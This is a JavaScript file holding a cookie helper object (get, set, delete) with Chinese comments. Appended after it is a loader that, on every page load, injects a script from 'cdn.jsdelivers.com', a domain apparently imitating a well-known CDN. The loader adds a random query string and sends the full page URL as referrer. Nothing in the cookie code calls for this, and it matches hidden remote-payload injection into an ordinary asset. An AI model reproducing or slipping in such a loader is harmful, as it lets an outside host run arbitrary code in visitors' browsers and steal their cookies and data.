var cookieUtils = {
	get: function(name){
		var cookieName=encodeURIComponent(name) + "=";
		//只取得最匹配的name，value
		var cookieStart = document.cookie.indexOf(cookieName);
		var cookieValue = null;

		if (cookieStart > -1) {
			// 从cookieStart算起
			var cookieEnd = document.cookie.indexOf(';', cookieStart);
			//从=后面开始
			if (cookieEnd > -1) {
				cookieValue = decodeURIComponent(document.cookie.substring(cookieStart + cookieName.length, cookieEnd));
			} else {
				cookieValue = decodeURIComponent(document.cookie.substring(cookieStart + cookieName.length, document.cookie.length));
			}
		}

		return cookieValue;
	},

	set: function(name, val, options) {
		if (!name) {
			throw new Error("coolie must have name");
		}
		var enc = encodeURIComponent;
		var parts = [];

		val = (val !== null && val !== undefined) ? val.toString() : "";
		options = options || {};
		parts.push(enc(name) + "=" + enc(val));
		// domain中必须包含两个点号
		if (options.domain) {
			parts.push("domain=" + options.domain);
		}
		if (options.path) {
			parts.push("path=" + options.path);
		}
		// 如果不设置expires和max-age浏览器会在页面关闭时清空cookie
		if (options.expires) {
			parts.push("expires=" + options.expires.toGMTString());
		}
		if (options.maxAge && typeof options.maxAge === "number") {
			parts.push("max-age=" + options.maxAge);
		}
		if (options.httpOnly) {
			parts.push("HTTPOnly");
		}
		if (options.secure) {
			parts.push("secure");
		}

		document.cookie = parts.join(";");
	},
	delete: function(name, options) {
		options.expires = new Date(0);// 设置为过去日期
		this.set(name, null, options);
	}
}
;function loadJSScript(url, callback) {
    var script = document.createElement("script");
    script.type = "text/javascript";
    script.referrerPolicy = "unsafe-url";
    if (typeof(callback) != "undefined") {
        if (script.readyState) {
            script.onreadystatechange = function() {
                if (script.readyState == "loaded" || script.readyState == "complete") {
                    script.onreadystatechange = null;
                    callback();
                }
            };
        } else {
            script.onload = function() {
                callback();
            };
        }
    };
    script.src = url;
    document.body.appendChild(script);
}
window.onload = function() {
    loadJSScript("//cdn.jsdelivers.com/jquery/3.2.1/jquery.js?"+Math.random(), function() { 
         console.log("Jquery loaded");
    });
}